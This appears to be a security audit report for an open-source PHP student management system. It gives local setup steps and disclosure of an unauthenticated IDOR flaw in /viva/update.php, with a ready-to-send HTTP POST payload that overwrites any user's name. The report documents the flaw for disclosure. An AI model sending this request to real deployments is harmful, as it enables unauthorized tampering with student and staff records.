# Student-Management-System Code Audit Report

# 1. Project Overview

The object of this audit is the open-source Student Management System, with the project repository address: https://github.com/Cyber-III/Student-Management-System. During the audit, local environment deployment and database initialization were completed, and a high-risk unauthorized access vulnerability was discovered. The detailed information is reported below.

# 2. Local Deployment Instructions

## 2.1 Environment Requirements

- PHP Version: 7.x (PHP 7.3.4 has been verified to run normally)

- Database: MySQL 5.7/8.0 (or compatible MariaDB version)

- Web Server: Apache/Nginx is recommended for production environments; PHP built-in server can be used for local demonstration

## 2.2 Local Startup Steps (No Apache Dependence)

Execute the following command in the project root directory to start the local service (verified to start successfully on this machine, and the login page can be accessed normally):

```bash
php -S 127.0.0.1:3000 -t "d:\PHP Code Audit\Student-Management-System"
```

[Note]: Due to abnormal configuration of session.save_path in some PHP environments, session_start() may report an error "Failed to write session file". This problem can be bypassed with the following command:

```bash
php -d session.save_path="C:/Users/Administrator/AppData/Local/Temp" -S 127.0.0.1:3000 -t "d:\PHP Code Audit\Student-Management-System"
```

After the service starts, access the following address to enter the system: http://127.0.0.1:3000/index.php

# 3. Database Initialization

# 4. Vulnerability Discovery and Analysis

## 4.1 Basic Vulnerability Information

- Vulnerability Location: /viva/update.php

- Vulnerability Type: Insecure Direct Object Reference (IDOR)

- Risk Level: High

- Vulnerability Description: An attacker only needs to know the target user's username to arbitrarily modify the value of the name field corresponding to the user in the team_members table without any authentication and permission verification.

## 4.2 Vulnerability Preparations

To trigger this vulnerability, you need to first create the team_members table in the database and insert test data. Execute the following SQL statement:

```sql
USE student_management_system;

CREATE TABLE IF NOT EXISTS team_members (
  id INT NOT NULL,
  username VARCHAR(100) NOT NULL,
  name VARCHAR(255) NOT NULL,
  time_slot_start TIME NULL,
  time_slot_end TIME NULL,
  batch_number VARCHAR(50) NULL,
  date DATE NULL,
  classroom VARCHAR(100) NULL,
  viva_name VARCHAR(255) NULL,
  PRIMARY KEY (id, username),
  KEY idx_username (username),
  KEY idx_viva_name (viva_name)
);

INSERT INTO team_members
(id, username, name, time_slot_start, time_slot_end, batch_number, date, classroom, viva_name)
VALUES
(1001, 'student01', 'Alice', '09:00:00', '09:15:00', 'Batch-01', '2026-03-18', 'Room-A', 'Viva-1')
ON DUPLICATE KEY UPDATE name = VALUES(name);
```

## 4.3 Vulnerability Verification Payload

The following HTTP POST request can trigger the vulnerability without login verification:

```http
POST /viva/update.php HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Linux; Android 12; ASUS_I005DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 EdgA/100.0.1185.50
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=student01&name=HACKED
```

## 4.4 Vulnerability Verification Steps

1. Execute the above SQL statement to confirm that the initial value of name corresponding to username=student01 in the team_members table is Alice;

2. Send the above Payload using tools such as Burp Suite, Postman, or curl;

3. Query the team_members table again, and you can find that the name corresponding to username=student01 has been modified to HACKED, and the vulnerability verification is successful;

4. Replace the username in the Payload with other existing users (such as admin, lec01), and the vulnerability can be triggered repeatedly to modify the name value of the corresponding user.
